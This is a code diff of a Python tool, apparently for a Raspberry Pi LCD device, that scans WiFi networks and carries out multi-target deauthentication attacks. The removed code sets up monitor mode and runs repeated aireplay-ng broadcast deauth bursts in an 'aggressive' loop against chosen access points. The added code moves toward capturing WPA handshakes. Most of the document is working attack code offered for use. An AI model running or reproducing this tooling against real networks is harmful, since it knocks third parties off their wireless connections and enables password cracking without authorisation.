-    draw.text((4, 27), f"Ch: {net['channel']}", font=font_small, fill=COLOR_GRAY)
-    draw.text((50, 27), f"BSSID: {net['bssid'][-8:]}", font=font_small, fill=COLOR_GRAY)
-
-    # Navigation indicator
-    draw.text((4, 38), f"AP {idx + 1}/{len(nets)}", font=font_small, fill=COLOR_YELLOW)
-    draw.text((50, 38), f"Selected: {len(targets)}", font=font_small, fill=COLOR_GREEN if targets else COLOR_GRAY)
-
-    # Separator
-    draw.line((4, 48, 124, 48), fill=COLOR_GRAY)
-
-    # Visible list window (show a few networks around current)
-    list_y = 51
-    start = max(0, idx - 2)
-    end = min(len(nets), start + 5)
-    if end - start < 5:
-        start = max(0, end - 5)
-    for i in range(start, end):
-        n = nets[i]
-        sel = n['bssid'] in [t['bssid'] for t in targets]
-        prefix = "*" if sel else " "
-        color = COLOR_GREEN if i == idx else (COLOR_YELLOW if sel else COLOR_GRAY)
-        name = n['essid'][:16]
-        draw.text((4, list_y), f"{prefix}{name}", font=font_small, fill=color)
-        list_y += 10
-
-    _draw_footer("OK:Sel  RIGHT:Attack  K3:Back")
-    LCD.LCD_ShowImage(canvas, 0, 0)
-
-
-def draw_attacking_screen(targets, pkt_count, elapsed, clients):
-    """Draw the attacking screen with red status header."""
-    draw.rectangle((0, 0, 128, 128), fill="black")
-    _draw_header("ATTACKING", COLOR_RED, COLOR_HEADER_ATTACK)
-
-    # Target count
-    draw.text((4, 16), f"Targets: {len(targets)}", font=font_body, fill=COLOR_RED)
-
-    # Elapsed time
-    draw.text((75, 16), _format_elapsed(elapsed), font=font_body, fill=COLOR_WHITE)
-
-    # Separator
-    draw.line((4, 27, 124, 27), fill=COLOR_RED)
-
-    # Packet counter (prominent)
-    draw.text((4, 30), "Deauth Packets:", font=font_small, fill=COLOR_GRAY)
-    draw.text((4, 40), str(pkt_count), font=font_title, fill=COLOR_RED)
-
-    # Clients discovered
-    draw.text((4, 53), f"Clients seen: {clients}", font=font_small, fill=COLOR_YELLOW)
-
-    # Target list
-    draw.line((4, 64, 124, 64), fill=COLOR_GRAY)
-    draw.text((4, 66), "Active targets:", font=font_small, fill=COLOR_GRAY)
-    list_y = 76
-    for t in targets[:4]:
-        name = t['essid'][:14]
-        draw.text((6, list_y), f"Ch{t['channel']:>3} {name}", font=font_small, fill=COLOR_RED)
-        list_y += 10
-    if len(targets) > 4:
-        draw.text((6, list_y), f"  +{len(targets) - 4} more...", font=font_small, fill=COLOR_GRAY)
-
-    _draw_footer("KEY2:Stop  KEY3:Exit")
-    LCD.LCD_ShowImage(canvas, 0, 0)
-
-
-def draw_scan_timeout_menu(timeout_val):
-    """Draw the scan timeout adjustment screen."""
-    draw.rectangle((0, 0, 128, 128), fill="black")
-    _draw_header("SCAN TIMEOUT", COLOR_YELLOW, COLOR_HEADER_IDLE)
-
-    draw.text((4, 20), f"Current: {timeout_val}s", font=font_title, fill=COLOR_WHITE)
-
-    draw.text((4, 45), "UP     +5s", font=font_small, fill=COLOR_GREEN)
-    draw.text((4, 57), "DOWN   -5s", font=font_small, fill=COLOR_GREEN)
-    draw.text((4, 69), "OK     Confirm", font=font_small, fill=COLOR_WHITE)
-    draw.text((4, 81), "KEY3   Cancel", font=font_small, fill=COLOR_RED)
-
-    _draw_footer(f"Range: 5s - 60s")
-    LCD.LCD_ShowImage(canvas, 0, 0)
-
-
-# Select WiFi interface via shared helper
-WIFI_INTERFACE = select_interface(LCD, scaled_font(), PINS, GPIO, iface_type="wifi")
-if not WIFI_INTERFACE:
-    WIFI_INTERFACE = get_wifi_interface()  # fallback to legacy detection
-
-def show(lines):
-    """Display text on LCD with word wrapping."""
-    if isinstance(lines, str):
-        lines = [lines]
-    
-    # Simple word wrapping
-    wrapped_lines = []
-    for line in lines:
-        if len(line) <= 20:
-            wrapped_lines.append(line)
+    _header("SETUP", CLR_YELLOW, CLR_BG_IDLE)
+    # Word wrap
+    words = msg.split()
+    lines = []
+    cur = ""
+    for w in words:
+        if len(cur + w) <= 20:
+            cur += w + " "
         else:
-            words = line.split()
-            current = ""
-            for word in words:
-                if len(current + word) <= 20:
-                    current += word + " "
-                else:
-                    if current:
-                        wrapped_lines.append(current.strip())
-                    current = word + " "
-            if current:
-                wrapped_lines.append(current.strip())
-    
-    # Limit lines and display
-    if len(wrapped_lines) > 8:
-        wrapped_lines = wrapped_lines[:7] + ["..."]
-    
-    draw.rectangle((0, 0, WIDTH, HEIGHT), fill="black")
-    y = 5
-    for line in wrapped_lines:
-        w = draw.textbbox((0, 0), line, font=font_large)[2]
-        x = (WIDTH - w) // 2
-        draw.text((x, y), line, font=font_large, fill="#00FF00")
+            if cur:
+                lines.append(cur.strip())
+            cur = w + " "
+    if cur:
+        lines.append(cur.strip())
+    y = 35
+    for ln in lines[:5]:
+        draw.text((4, y), ln, font=FNT_SM, fill=color)
         y += 12
-    
-    LCD.LCD_ShowImage(canvas, 0, 0)
+    _refresh()
 
-def show_status(message):
-    """Show short status message for LCD (15 chars max)."""
-    # During attacks, only log status messages to avoid overwriting attack menu
-    if current_screen == "attacking":
-        log(f"STATUS: {message}")
-    else:
-        show([message[:15]])
-        time.sleep(0.8)  # Brief display time
+# ---------------------------------------------------------------------------
+# Flash effect for handshake capture
+# ---------------------------------------------------------------------------
 
-def pressed_button():
-    """Return pressed button name."""
-    return get_button(PINS, GPIO)
-
-def run_command(cmd, timeout=None):
-    """Execute shell command."""
+def flash_green_capture():
+    """Full-screen green flash for handshake capture."""
     try:
-        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
-        stdout, stderr = process.communicate(timeout=timeout)
-        result = stdout.decode("utf-8") + stderr.decode("utf-8")
-        return result
-    except:
-        return "Error"
-
-def check_interface_exists():
-    """Check if the WiFi interface exists and is available."""
-    global WIFI_INTERFACE
-    
-    log(f"Checking if interface {WIFI_INTERFACE} exists")
-    show_status("Checking iface...")
-    
-    result = run_command(f"iwconfig {WIFI_INTERFACE}")
-    
-    if "No such device" in result:
-        log(f"Interface {WIFI_INTERFACE} not found, trying alternatives")
-        show_status("Finding iface...")
-        
-        # Try alternative interfaces (skip reserved WebUI interface)
-        for iface in INTERFACE_PATTERNS:
-            if iface == WEBUI_INTERFACE or iface == f"{WEBUI_INTERFACE}mon":
-                continue
-            result = run_command(f"iwconfig {iface}")
-            if "No such device" not in result and "IEEE 802.11" in result:
-                log(f"Found working interface: {iface}")
-                WIFI_INTERFACE = iface
-                show_status(f"Found {iface}")
-                return True
-        
-        # Check for USB dongles specifically
-        show_status("Check USB dongles...")
-        usb_check = run_command("lsusb | grep -Ei 'realtek|ralink|atheros|broadcom'")
-        if usb_check:
-            log(f"USB WiFi dongles detected: {usb_check}")
-            show_status("USB dongles found!")
-            time.sleep(1)
-            show_status("Plug in USB dongle")
-            time.sleep(2)
-        else:
-            show_status("No USB dongles!")
-            time.sleep(1)
-        
-        show_status("No WiFi found!")
-        return False
-    
-    show_status(f"Using {WIFI_INTERFACE}")
-    return True
-
-def setup_monitor_mode():
-    """Set up monitor mode on the WiFi interface."""
-    global WIFI_INTERFACE
-    
-    log("Setting up monitor mode")
-    show_status("Setup monitor...")
-    
-    # Check if this is the onboard Raspberry Pi WiFi
-    driver_check = run_command(f"ethtool -i {WIFI_INTERFACE} 2>/dev/null || echo 'unknown'")
-    if "brcmfmac" in driver_check:
-        log("DETECTED: Onboard Raspberry Pi WiFi (Broadcom 43430)")
-        show_status("ONBOARD WIFI!")
-        time.sleep(1)
-        show_status("NO MONITOR MODE!")
-        time.sleep(1)
-        show_status("USE USB DONGLE!")
-        time.sleep(2)
-        
-        show([
-            "ONBOARD WIFI LIMITATION",
-            "Broadcom 43430 chip",
-            "NO monitor mode support",
-            "Use USB WiFi dongle"
-        ])
-        time.sleep(3)
-        
-        show([
-            "RECOMMENDED DONGLES:",
-            "Alfa AWUS036ACH",
-            "TP-Link TL-WN722N v1", 
-            "Panda PAU09"
-        ])
-        time.sleep(3)
-        
-        show_status("Switch to USB dongle")
-        return False
-    
-    # Tell NetworkManager to stop managing this interface only (keeps wlan0/WebUI alive)
-    show_status("Unmanage iface...")
-    run_command(f"nmcli device set {WIFI_INTERFACE} managed no")
-    # Only kill wpa_supplicant for this specific interface
-    run_command(f"pkill -f 'wpa_supplicant.*{WIFI_INTERFACE}'")
-    time.sleep(1)
-    
-    # Check current mode
-    iwconfig_result = run_command(f"iwconfig {WIFI_INTERFACE}")
-    log(f"Current interface status: {iwconfig_result[:200]}")
-    
-    if "Mode:Monitor" in iwconfig_result:
-        log("Interface already in monitor mode")
-        show_status("Monitor ready!")
-        time.sleep(1)
-        return True
-    
-    # Try to enable monitor mode
-    show_status("Enable monitor...")
-    
-    # Method 1: Use airmon-ng
-    log("Trying airmon-ng method")
-    show_status("Try airmon-ng...")
-    result = run_command(f"airmon-ng start {WIFI_INTERFACE}")
-    log(f"airmon-ng result: {result}")
-    
-    # Check if a monitor interface was created
-    for iface in [f"{WIFI_INTERFACE}mon", WIFI_INTERFACE]:
-        check_result = run_command(f"iwconfig {iface}")
-        if "Mode:Monitor" in check_result:
-            log(f"Monitor mode enabled on {iface}")
-            WIFI_INTERFACE = iface
-            show_status("Monitor OK!")
-            time.sleep(1)
-            return True
-    
-    # Method 2: Manual iwconfig method
-    log("Trying manual iwconfig method")
-    show_status("Manual setup...")
-    run_command(f"ifconfig {WIFI_INTERFACE} down")
-    time.sleep(0.5)
-    run_command(f"iwconfig {WIFI_INTERFACE} mode monitor")
-    time.sleep(0.5)
-    run_command(f"ifconfig {WIFI_INTERFACE} up")
-    time.sleep(1)
-    
-    # Verify monitor mode
-    check_result = run_command(f"iwconfig {WIFI_INTERFACE}")
-    if "Mode:Monitor" in check_result:
-        log("Monitor mode enabled via iwconfig")
-        show_status("Monitor OK!")
-        time.sleep(1)
-        return True
-    
-    log("Failed to enable monitor mode")
-    show_status("Monitor FAILED!")
-    time.sleep(2)
-    return False
-
-def validate_setup():
-    """Validate that everything is set up correctly for deauth attacks."""
-    log("Validating setup for deauth attacks")
-    show_status("Validating...")
-    
-    # Check if interface exists
-    if not check_interface_exists():
-        show_status("No WiFi iface!")
-        time.sleep(2)
-        return False
-    
-    # Check if aircrack-ng tools are available
-    show_status("Check tools...")
-    aireplay_check = run_command("which aireplay-ng")
-    if "aireplay-ng" not in aireplay_check:
-        show_status("No aireplay!")
-        time.sleep(3)
-        return False
-    
-    airodump_check = run_command("which airodump-ng")
-    if "airodump-ng" not in airodump_check:
-        show_status("No airodump!")
-        time.sleep(3)
-        return False
-    
-    # Set up monitor mode
-    if not setup_monitor_mode():
-        return False
-    
-    log("Setup validation completed successfully")
-    show_status("Setup OK!")
-    time.sleep(1)
-    return True
-
-def scan_networks():
-    """Scan for networks and return list."""
-    log(f"Starting network scan, timeout: {SCAN_TIMEOUT}s")
-    show_status(f"Scanning {SCAN_TIMEOUT}s...")
-    
-    # Clean up and scan
-    subprocess.run("rm -f /tmp/deauth_scan*", shell=True)
-    cmd = f"timeout {SCAN_TIMEOUT} airodump-ng --band abg --output-format csv -w /tmp/deauth_scan {WIFI_INTERFACE}"
-    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    log(f"Scan command completed with return code: {result.returncode}")
-    
-    show_status("Parsing scan...")
-    
-    # Parse results
-    networks = []
-    try:
-        with open('/tmp/deauth_scan-01.csv', 'r') as f:
-            content = f.read()
-        
-        if 'Station MAC' in content:
-            content = content.split('Station MAC')[0]
-        
-        lines = content.strip().split('\n')
-        bssid_idx = essid_idx = channel_idx = -1
-        
-        for line in lines:
-            if 'BSSID' in line and 'ESSID' in line:
-                header_parts = line.split(',')
-                for i, part in enumerate(header_parts):
-                    if 'BSSID' in part:
-                        bssid_idx = i
-                    elif 'ESSID' in part:
-                        essid_idx = i
-                    elif 'channel' in part.lower():
-                        channel_idx = i
-                continue
-            
-            if bssid_idx >= 0 and essid_idx >= 0:
-                parts = line.split(',')
-                if len(parts) > max(bssid_idx, essid_idx):
-                    bssid = parts[bssid_idx].strip()
-                    essid = parts[essid_idx].strip().strip('"')
-                    channel = parts[channel_idx].strip() if channel_idx >= 0 and channel_idx < len(parts) else "?"
-                    
-                    if essid and bssid and ':' in bssid:
-                        # Add band indicator
-                        band = ""
-                        if channel.isdigit():
-                            ch = int(channel)
-                            if ch <= 14:
-                                band = " (2.4G)"
-                            elif ch >= 36:
-                                band = " (5G)"
-                        
-                        networks.append({
-                            "essid": essid[:16] + band,
-                            "bssid": bssid,
-                            "channel": channel
-                        })
-    except Exception as e:
-        log(f"Error parsing scan results: {str(e)}")
-    
-    log(f"Found {len(networks)} networks")
-    show_status(f"Found {len(networks)} nets")
-    time.sleep(1)
-    
-    for i, net in enumerate(networks):
-        log(f"Network {i+1}: {net['essid']} - {net['bssid']} - Ch{net['channel']}")
-    
-    return networks
-
-def start_attacks():
-    """Start attacks on selected targets using direct Python attack."""
-    global attack_processes, current_attack_process, attack_stop_event
-    
-    if not selected_targets:
-        show_status("No targets!")
-        time.sleep(2)
-        return False
-    
-    log(f"Starting attacks on {len(selected_targets)} targets")
-    show_status("Start attacks...")
-    
-    # Reset stop event
-    attack_stop_event.clear()
-    
-    # Kill any interfering processes first
-    show_status("Kill old procs...")
-    run_command("pkill -f aireplay-ng")
-    run_command("pkill -f airodump-ng")
-    time.sleep(1)
-    
-    # Use direct Python attack (proven working)
-    return start_direct_python_attack()
-
-def start_direct_python_attack():
-    """Start a direct Python-controlled deauth attack with aggressive triple attacks."""
-    global attack_processes, attack_threads
-    
-    log("Starting direct Python deauth attack")
-    show_status("Start Python...")
-    
-    def aggressive_attack_worker():
-        """Worker thread that performs aggressive triple deauth attacks on all targets."""
-        global deauth_packet_count, discovered_clients
-        attack_log = LOG_FILE.replace('.log', '_attack.log')
-        attack_count = 0
-        
-        def log_attack(message):
-            timestamp = time.strftime("%H:%M:%S")
-            try:
-                with open(attack_log, 'a') as f:
-                    f.write(f"[{timestamp}] {message}\n")
-                    f.flush()
-                log(message)  # Also log to main log
-            except:
-                pass
-        
-        log_attack("=== Starting Aggressive Triple Deauth Attack ===")
-        log_attack(f"Interface: {WIFI_INTERFACE}")
-        log_attack(f"Targets: {len(selected_targets)}")
-        
-        # Initialize attack log
-        try:
-            with open(attack_log, 'w') as f:
-                f.write(f"=== Aggressive Deauth Attack Log Started {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
-        except:
-            pass
-        
-        while not attack_stop_event.is_set():
-            for target in selected_targets:
-                if attack_stop_event.is_set():
-                    break
-                    
-                if target['channel'] == '?' or not target['channel'].isdigit():
-                    log_attack(f"Skipping {target['essid']} - invalid channel")
-                    continue
-                
-                attack_count += 1
-                discovered_clients = len(selected_targets)
-                log_attack(f"=== Attack #{attack_count} on {target['essid']} (Ch{target['channel']}) ===")
-                
-                # Update LCD with current target
-                show_status(f"Attack {target['essid'][:8]}")
-                
-                try:
-                    # Set channel
-                    log_attack(f"Setting channel {target['channel']}...")
-                    channel_result = run_command(f"iwconfig {WIFI_INTERFACE} channel {target['channel']}")
-                    time.sleep(0.5)
-                    
-                    if attack_stop_event.is_set():
-                        break
-                    
-                    # Verify channel (simplified check)
-                    verify_result = run_command(f"iwconfig {WIFI_INTERFACE}")
-                    if f"Channel:{target['channel']}" in verify_result or f"Frequency:" in verify_result:
-                        log_attack(f"Channel {target['channel']} set successfully")
-                    else:
-                        log_attack(f"WARNING: Channel {target['channel']} may not be set correctly")
-                        log_attack(f"iwconfig output: {verify_result[:100]}")
-                    
-                    # Check interface mode
-                    if "Mode:Monitor" in verify_result:
-                        log_attack("Interface in Monitor mode - GOOD")
-                    else:
-                        log_attack("WARNING: Interface not in Monitor mode!")
-                        log_attack(f"Current mode: {verify_result}")
-                    
-                    # RESEARCH-BASED MAXIMUM DEAUTH AGGRESSION
-                    log_attack("Starting RESEARCH-BASED MAXIMUM DEAUTH AGGRESSION...")
-                    
-                    # Attack 1: CONTINUOUS Broadcast Deauth (PROVEN WORKING - 10 seconds unlimited)
-                    if not attack_stop_event.is_set():
-                        log_attack("Launching CONTINUOUS broadcast deauth (10 seconds unlimited)...")
-                        show_status("CONTINUOUS 10s")
-                        cmd1 = f"timeout 10 aireplay-ng -0 0 -a {target['bssid']} -c FF:FF:FF:FF:FF:FF {WIFI_INTERFACE}"
-                        log_attack(f"Command: {cmd1}")
-                        result1 = run_command(cmd1)
-                        log_attack(f"CONTINUOUS result: {result1[:200]}")
-                        if "Sending" in result1 and "DeAuth" in result1:
-                            log_attack("CONTINUOUS deauth: SUCCESS - unlimited packets sent!")
-                            deauth_packet_count += 200  # Approximate for 10s continuous
-                        else:
-                            log_attack("CONTINUOUS deauth: May have worked (check for DeAuth messages)")
-                        
-                        time.sleep(0.3)
-                    
-                    # Attack 2: BURST 1 - 64 packet broadcast (PROVEN WORKING)
-                    if not attack_stop_event.is_set():
-                        log_attack("Launching BURST 1 broadcast deauth (64 packets)...")
-                        show_status("BURST 1 - 64pkt")
-                        cmd2 = f"aireplay-ng -0 64 -a {target['bssid']} -c FF:FF:FF:FF:FF:FF {WIFI_INTERFACE}"
-                        log_attack(f"Command: {cmd2}")
-                        result2 = run_command(cmd2)
-                        log_attack(f"BURST 1 result: {result2[:200]}")
-                        if "Sending" in result2 and "DeAuth" in result2:
-                            log_attack("BURST 1 deauth: SUCCESS - packets sent!")
-                            deauth_packet_count += 64
-                        else:
-                            log_attack("BURST 1 deauth: May have worked")
-                            deauth_packet_count += 64
-                        
-                        time.sleep(0.3)
-                    
-                    # Attack 3: BURST 2 - 64 packet broadcast (PROVEN WORKING)
-                    if not attack_stop_event.is_set():
-                        log_attack("Launching BURST 2 broadcast deauth (64 packets)...")
-                        show_status("BURST 2 - 64pkt")
-                        cmd3 = f"aireplay-ng -0 64 -a {target['bssid']} -c FF:FF:FF:FF:FF:FF {WIFI_INTERFACE}"
-                        log_attack(f"Command: {cmd3}")
-                        result3 = run_command(cmd3)
-                        log_attack(f"BURST 2 result: {result3[:200]}")
-                        if "Sending" in result3 and "DeAuth" in result3:
-                            log_attack("BURST 2 deauth: SUCCESS - packets sent!")
-                            deauth_packet_count += 64
-                        else:
-                            log_attack("BURST 2 deauth: May have worked")
-                            deauth_packet_count += 64
-                        
-                        time.sleep(0.3)
-                    
-                    # Attack 4: BURST 3 - 64 packet broadcast (PROVEN WORKING)
-                    if not attack_stop_event.is_set():
-                        log_attack("Launching BURST 3 broadcast deauth (64 packets)...")
-                        show_status("BURST 3 - 64pkt")
-                        cmd4 = f"aireplay-ng -0 64 -a {target['bssid']} -c FF:FF:FF:FF:FF:FF {WIFI_INTERFACE}"
-                        log_attack(f"Command: {cmd4}")
-                        result4 = run_command(cmd4)
-                        log_attack(f"BURST 3 result: {result4[:200]}")
-                        if "Sending" in result4 and "DeAuth" in result4:
-                            log_attack("BURST 3 deauth: SUCCESS - packets sent!")
-                            deauth_packet_count += 64
-                        else:
-                            log_attack("BURST 3 deauth: May have worked")
-                            deauth_packet_count += 64
-                    
-                    log_attack(f"Completed RESEARCH-BASED MAXIMUM DEAUTH on {target['essid']}")
-                    log_attack("TOTAL PROVEN DEAUTH: 10s continuous + 64+64+64 = ~300+ packets!")
-                    log_attack("Using ONLY broadcast deauth (-c FF:FF:FF:FF:FF:FF) that WORKS!")
-                    log_attack("---")
-                    
-                except Exception as e:
-                    log_attack(f"Error attacking {target['essid']}: {str(e)}")
-                    import traceback
-                    log_attack(f"Full error: {traceback.format_exc()}")
-                
-                # Brief pause between targets (original timing)
-                if not attack_stop_event.wait(1):  # Wait 1 second or until stop event
-                    continue
-                else:
-                    break
-            
-            # Pause between attack cycles (original timing)
-            show_status("Cycle pause...")
-            if not attack_stop_event.wait(3):  # Wait 3 seconds or until stop event
-                log_attack("Aggressive attack cycle completed, continuing...")
-            else:
-                break
-        
-        log_attack("Aggressive attack thread stopping...")
-        show_status("Attack stopped")
-    
-    # Start the aggressive worker thread
-    try:
-        attack_thread = threading.Thread(target=aggressive_attack_worker, daemon=True)
-        attack_thread.start()
-        attack_threads.append(attack_thread)
-        
-        # Add to attack_processes for compatibility with UI
-        attack_processes.append({
-            'type': 'thread',
-            'thread': attack_thread,
-            'target': {'essid': f'Aggressive attack on {len(selected_targets)} targets'}, 
-            'cmd': 'Aggressive triple deauth attack'
-        })
-        
-        log(f"Started aggressive attack on {len(selected_targets)} targets")
-        show_status("Aggressive ON!")
-        time.sleep(1)
-        return True
-        
-    except Exception as e:
-        log(f"Failed to start aggressive attack: {str(e)}")
-        import traceback
-        log(f"Full error: {traceback.format_exc()}")
-        show_status("Attack failed!")
-        return False
-
-
-
-def stop_all_attacks():
-    """Stop all running attacks - both processes and threads."""
-    global attack_processes, current_attack_process, attack_stop_event, attack_threads
-    
-    stopped_count = 0
-    
-    # Signal all threads to stop
-    attack_stop_event.set()
-    
-    # Stop single attack
-    if current_attack_process:
-        try:
-            os.killpg(os.getpgid(current_attack_process.pid), signal.SIGTERM)
-            current_attack_process.wait()
-            current_attack_process = None
-            stopped_count += 1
-        except:
-            pass
-    
-    # Stop multi-target attacks
-    for attack_info in attack_processes:
-        try:
-            if attack_info.get('type') == 'process':
-                # Stop subprocess
-                os.killpg(os.getpgid(attack_info['process'].pid), signal.SIGTERM)
-                attack_info['process'].wait()
-                stopped_count += 1
-                log(f"Stopped process attack on {attack_info['target']['essid']}")
-            elif attack_info.get('type') == 'thread':
-                # Thread will stop due to attack_stop_event being set
-                log(f"Signaled thread attack to stop")
-                stopped_count += 1
-        except Exception as e:
-            log(f"Error stopping attack: {str(e)}")
-    
-    # Wait for threads to finish
-    for thread in attack_threads:
-        if thread.is_alive():
-            thread.join(timeout=2)  # Wait up to 2 seconds for thread to stop
-    
-    attack_processes.clear()
-    attack_threads.clear()
-    log(f"Stopped {stopped_count} attacks")
-    return stopped_count
-
-def simple_cleanup():
-    """Simple, reliable cleanup without complex interface detection."""
-    try:
-        log("Starting simple cleanup")
-        show_status("Cleaning up...")
-        
-        # Stop all attacks
-        stop_all_attacks()
-        
-        # Kill any remaining attack processes
-        run_command("pkill -f aireplay-ng 2>/dev/null || true")
-        run_command("pkill -f airodump-ng 2>/dev/null || true")
-        
-        # Re-manage the interface in NetworkManager (NM was never stopped)
-        run_command(f"nmcli device set {WIFI_INTERFACE} managed yes 2>/dev/null || true")
-        
-        log("Simple cleanup completed")
-        
-    except Exception as e:
-        log(f"Error during cleanup: {str(e)}")
-        # Continue anyway
+        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
+        d = ScaledDraw(img)
+        d.rectangle((0, 0, 127, 127), fill=CLR_GREEN)
+        d.text((20, 50), "HS CAPTURED!", font=FNT_MD, fill="#000000")
+        LCD.LCD_ShowImage(img, 0, 0)
+        time.sleep(0.5)
+    except Exception:
         pass
 
-def signal_handler(signum, frame):
-    """Handle signals (like Ctrl+C) for clean exit."""
-    global running
-    log(f"Received signal {signum}, initiating clean shutdown")
-    running = False
-    simple_cleanup()
-    LCD.LCD_Clear()
-    GPIO.cleanup()
-    sys.exit(0)
+# ---------------------------------------------------------------------------
+# Signal handlers
+# ---------------------------------------------------------------------------
 
-# Set up signal handlers for clean exit
-signal.signal(signal.SIGINT, signal_handler)   # Ctrl+C
-signal.signal(signal.SIGTERM, signal_handler)  # Termination signal
+_running = True
 
+
+def _signal_handler(signum, frame):
+    global _running
+    _running = False
+
+
+signal.signal(signal.SIGINT, _signal_handler)
+signal.signal(signal.SIGTERM, _signal_handler)
+
+# ---------------------------------------------------------------------------
 # Initialize log
+# ---------------------------------------------------------------------------
+
 try:
-    with open(LOG_FILE, 'w') as f:
-        f.write(f"=== WiFi Deauth Log Started {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
-        f.write(f"Using interface: {WIFI_INTERFACE}\n")
-        f.write(f"WiFi integration: {WIFI_INTEGRATION}\n")
-except:
+    with open(LOG_FILE, "w") as f:
+        f.write(f"=== WiFi Deauth Log {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+        f.write(f"Interface: {WIFI_INTERFACE}\n")
+except Exception:
     pass
 
-draw.rectangle((0, 0, 128, 128), fill="black")
-_draw_header("INITIALIZING", COLOR_YELLOW, COLOR_HEADER_IDLE)
-draw.text((4, 20), "WiFi Deauth", font=font_title, fill=COLOR_WHITE)
-draw.text((4, 33), "Multi-Target", font=font_body, fill=COLOR_GRAY)
-draw.text((4, 48), f"Iface: {WIFI_INTERFACE}", font=font_small, fill=COLOR_GREEN)
-LCD.LCD_ShowImage(canvas, 0, 0)
-time.sleep(2)
+# ---------------------------------------------------------------------------
+# Validate setup
+# ---------------------------------------------------------------------------
 
-# Validate setup before starting
-if not validate_setup():
-    show(["Setup failed!", "Check logs and", "fix issues", "Press KEY3 to exit"])
+draw_status(f"Checking {WIFI_INTERFACE}...")
+ok, WIFI_INTERFACE = validate_setup(WIFI_INTERFACE)
+if not ok:
+    draw_status("Setup failed! Check USB dongle. KEY3=Exit", CLR_RED)
     while True:
-        btn = pressed_button()
+        btn = get_button(PINS, GPIO)
         if btn == "KEY3":
             break
         time.sleep(0.1)
-    simple_cleanup()
     LCD.LCD_Clear()
     GPIO.cleanup()
     sys.exit(1)
 
-def show_main_menu_page():
-    """Show the current main menu page."""
-    global main_menu_page
-    draw_main_menu(main_menu_page)
+draw_status(f"Monitor OK: {WIFI_INTERFACE}", CLR_GREEN)
+time.sleep(1)
 
-def switch_interface():
-    """Switch WiFi interface using the proven fast_wifi_switcher approach."""
-    global WIFI_INTERFACE
-    
-    if not WIFI_INTEGRATION:
-        show_status("WiFi integ N/A!")
-        time.sleep(2)
-        return
-    
-    # Build candidate dongle interfaces dynamically (skip onboard/WebUI interface)
-    current = WIFI_INTERFACE
-    candidates = []
-    try:
-        interfaces = get_available_interfaces() if WIFI_INTEGRATION else []
-        candidates = [
-            i for i in interfaces
-            if i.startswith("wlan") and i != WEBUI_INTERFACE
-        ]
-    except Exception:
-        candidates = []
+# ---------------------------------------------------------------------------
+# Main loop
+# ---------------------------------------------------------------------------
 
-    if not candidates:
-        # fallback to hardcoded names if integration list is unavailable
-        candidates = ["wlan0", "wlan1", "wlan2"]
-        candidates = [i for i in candidates if i != WEBUI_INTERFACE]
+state = "idle"
+scan_timeout = SCAN_TIMEOUT_DEFAULT
+attack_mode = MODE_DEAUTH
+networks = []
+selected_index = 0
+selected_targets = []
+attack_stop = threading.Event()
+attack_threads_list = []
+attack_stats = {"packets": 0, "clients": 0, "eapol": 0, "hs_captured": 0, "hs_ssid": ""}
+attack_start_time = 0
+hs_flash_until = 0
+prev_hs_count = 0
+scan_start_time = 0
 
-    candidates.sort(key=lambda x: (int(x[4:]) if x[4:].isdigit() else 999, x))
-    if not candidates:
-        show_status("No dongle iface")
-        time.sleep(2)
-        return
-
-    if current in candidates:
-        idx = candidates.index(current)
-        target_interface = candidates[(idx + 1) % len(candidates)]
-    else:
-        target_interface = candidates[0]
-    
-    show_status(f"Switch to {target_interface}")
-    
-    def lcd_callback(msg):
-        """Callback to show status on LCD."""
-        show_status(msg[:15])
-        time.sleep(0.5)
-    
-    try:
-        log(f"🔄 Switching to {target_interface} using proven integration function")
-        
-        # Use the SAME proven approach as fast_wifi_switcher.py
-        # This includes all the bug fixes and working code
-        success = set_raspyjack_interface(target_interface, lcd_callback)
-        
-        if success:
-            WIFI_INTERFACE = target_interface
-            show_status("Switch OK!")
-            log(f"✅ Successfully switched to {target_interface}")
-            time.sleep(1)
-        else:
-            show_status("Switch failed!")
-            log(f"❌ Failed to switch to {target_interface}")
-            time.sleep(2)
-            
-    except Exception as e:
-        show_status("Switch error!")
-        log(f"❌ Switch error: {e}")
-        time.sleep(2)
-
-# Main event loop
-current_screen = "main"
-main_menu_page = 0  # Track which page of main menu we're on
-draw_main_menu(main_menu_page)
+draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
 
 try:
-    # Initialize periodic refresh for attacking screen
-    last_attacking_refresh = 0
-    ATTACKING_REFRESH_INTERVAL = 3  # Refresh attacking screen every 3 seconds
-    
-    while running:
-        try:
-            current_time = time.time()
-            
-            # Periodic refresh for attacking screen to keep menu visible
-            if (current_screen == "attacking" and
-                current_time - last_attacking_refresh > ATTACKING_REFRESH_INTERVAL):
+    while _running:
+        btn = get_button(PINS, GPIO)
+        now = time.time()
 
-                elapsed = current_time - attack_start_time
-                draw_attacking_screen(selected_targets, deauth_packet_count, elapsed, discovered_clients)
-                last_attacking_refresh = current_time
-            
-            btn = pressed_button()
-            
-            if current_screen == "main":
-                # MAIN MENU - Handle page navigation
-                if btn == "UP":  # Previous page
-                    while pressed_button() == "UP":
-                        time.sleep(0.05)
-                    main_menu_page = (main_menu_page - 1) % 3  # 3 pages total
-                    show_main_menu_page()
-                elif btn == "DOWN":  # Next page  
-                    while pressed_button() == "DOWN":
-                        time.sleep(0.05)
-                    main_menu_page = (main_menu_page + 1) % 3  # 3 pages total
-                    show_main_menu_page()
-                elif btn == "KEY1":  # Scan networks
-                    while pressed_button() == "KEY1":
-                        time.sleep(0.05)
-                    
-                    networks = scan_networks()
-                    if networks:
-                        selected_index = 0
-                        selected_targets = []
-                        current_screen = "networks"
-                        draw_network_list(networks, selected_index, selected_targets)
-                    else:
-                        show(["No networks found!", "Try longer timeout", "", "Press any key..."])
-                        time.sleep(3)
-                        show_main_menu_page()
-                
-                elif btn == "LEFT":  # Adjust timeout (RESTORED)
-                    while pressed_button() == "LEFT":
-                        time.sleep(0.05)
-                    
-                    while True:
-                        draw_scan_timeout_menu(SCAN_TIMEOUT)
-                        btn = pressed_button()
-                        
-                        if btn == "UP":
-                            while pressed_button() == "UP":
-                                time.sleep(0.05)
-                            SCAN_TIMEOUT = min(60, SCAN_TIMEOUT + 5)
